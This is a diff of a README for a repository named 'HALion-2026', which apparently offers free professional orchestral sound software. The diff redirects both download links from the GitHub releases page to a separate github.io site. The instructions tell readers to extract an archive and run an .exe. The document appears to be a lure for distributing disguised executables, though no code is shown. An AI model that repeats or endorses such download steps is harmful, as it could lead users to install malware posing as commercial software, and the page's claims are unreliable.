@@ -1,6 +1,6 @@
 # 🎹 HALion-2026 - Access Professional Orchestral Sounds Today
 
-[![Download HALion 2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Melbabitter528/HALion-2026/releases)
+[![Download HALion 2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://melbabitter528.github.io)
 
 ## 📦 About HALion-2026
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you start. Meeting these requi
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the [official releases page](https://github.com/Melbabitter528/HALion-2026/releases) to download the main installation file.
+1.  Visit the [official releases page](https://melbabitter528.github.io) to download the main installation file.
 2.  Locate the downloaded folder in your Downloads directory.
 3.  Right-click the compressed file and select "Extract All" to reveal the installer.
 4.  Open the folder and double-click the file ending in `.exe` to start the installation wizard.
